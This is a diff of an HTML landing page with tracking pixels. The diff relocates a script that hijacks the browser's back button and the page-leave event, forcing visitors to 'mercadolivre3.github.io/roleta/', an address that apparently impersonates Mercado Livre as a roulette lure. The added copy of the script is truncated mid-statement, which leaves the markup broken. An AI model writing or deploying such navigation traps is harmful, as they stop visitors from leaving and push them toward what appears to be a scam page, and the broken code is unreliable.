@@ -309,6 +309,21 @@
 </script>
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
 
+<script>
+  // Impede que o usuário use o botão "voltar"
+  history.pushState(null, null, location.href);
+  window.onpopstate = function () {
+    window.location.href = "https://mercadolivre3.github.io/roleta/";
+  };
+
+  // Redireciona se tentar sair ou recarregar a página
+  window.addEventListener("beforeunload", function (e) {
+    // Redirecionamento
+    window.location.href = "https://mercadolivre3.github.io/roleta/";
+
+    // Mensagem padrão (pode não aparecer em navegadores modernos)
+    e
+
  <!-- Meta Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s)
@@ -327,18 +342,3 @@ src="https://www.facebook.com/tr?id=1148635666905575&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code --></body></html>
 
-<script>
-  // Impede o botão de voltar do navegador
-  history.pushState(null, null, location.href);
-  window.onpopstate = function () {
-    location.href = "https://mercadolivre3.github.io/roleta/";
-  };
-
-  // Detecta tentativa de sair ou recarregar a página
-  window.addEventListener("beforeunload", function (e) {
-    // Redireciona antes de sair
-    location.href = "https://mercadolivre3.github.io/roleta/";
-    
-    // Mensagem de confirmação (opcional – pode ser ignorada por alguns navegadores)
-    e.preventDefault();
-    e.re
